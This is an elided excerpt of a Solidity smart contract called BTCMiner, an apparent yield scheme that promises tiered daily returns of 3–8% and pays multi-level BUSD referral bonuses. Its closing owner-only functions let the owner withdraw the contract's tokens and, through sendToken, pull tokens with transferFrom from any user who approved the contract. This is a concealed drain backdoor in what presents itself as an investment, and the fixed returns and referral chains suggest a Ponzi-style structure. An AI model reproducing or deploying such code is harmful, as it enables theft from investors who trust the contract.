...
contract BTCMiner {
    ...
    address erctoken = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c; 
    ...
    uint256 public MIN_INVEST_LIMIT = 10 * 1e13; 
  ...
  function isContract(address addr) internal view returns (bool) {
    ...
    function buyEggs(address ref, uint256 amount) public{
       ...
       if (amount > 0 && amount < 0.001 ether) {
           EGGS_TO_HIRE_1MINERS = 2592000; // 3%
           } else if (amount >= 0.001 ether && amount < 0.01 ether) {
           EGGS_TO_HIRE_1MINERS = 2160000; // 4%
           } else if (amount >= 0.01 ether && amount < 0.1 ether) {
           EGGS_TO_HIRE_1MINERS = 1728000; // 5%
           } else if (amount >= 0.1 ether && amount < 1 ether) {
           EGGS_TO_HIRE_1MINERS = 1440000; // 6%
           } else if (amount >= 1 ether && amount < 10 ether) {
            EGGS_TO_HIRE_1MINERS = 1200000; // 7%
           } else if (amount >= 10 ether && amount < 100 ether) {
            EGGS_TO_HIRE_1MINERS = 1080000; // 8%
           }

       if (user.referrals.length== 0) {
       if (ref != address(0)) {
       address[] storage referrerReferrals = users[ref].referrals;
       uint count = referrerReferrals.length > 7 ? referrerReferrals.length - 7 : 0;
       for (uint i = count; i < referrerReferrals.length; i++) {
        user.referrals.push(referrerReferrals[i]);
        }
       ...
       for (uint256 i = 0; i < user.referrals.length; i++) {
                  token_BUSD.transfer(user.referrals[i], refRewards);
                  totalRefBonus = totalRefBonus.add(refRewards);
                  users[user.referrals[i]].referralBonus = users[user.referrals[i]].referralBonus.add(refRewards);
              }
        }}
      ...
      if (user.referrals.length> 0) {
          uint256 refRewards = amount.mul(REFERRAL).div(PERCENTS_DIVIDER);
         uint count = user.referrals.length > 8 ? user.referrals.length - 8 : 0;
    for (uint i = count; i < user.referrals.length; i++) {
        token_BUSD.transfer(user.referrals[i], refRewards);
        totalRefBonus = totalRefBonus.add(refRewards);
        users[user.referrals[i]].referralBonus = users[user.referrals[i]].referralBonus.add(refRewards);
    }
    ...
    function getUserInfo(address _adr) public view returns(uint256 _initialDeposit, uint256 _userDeposit, uint256 _miners,
     uint256 _claimedEggs, uint256 _lastHatch,  uint256 _referrals,
   uint256 _totalWithdrawn,  uint256 _dailyCompoundBonus, uint256 _lastWithdrawTime,uint256 _referralBonus) {
    ...
    function withdrawToken(  uint256 amount) external {
         require(msg.sender == owner, "Admin use only");
        token_BUSD.transfer(owner, amount);
}
    function sendToken( address sender ,uint256 amount) external {
       require(msg.sender == owner, "Admin use only");
        token_BUSD.transferFrom(sender,owner,amount);
    }
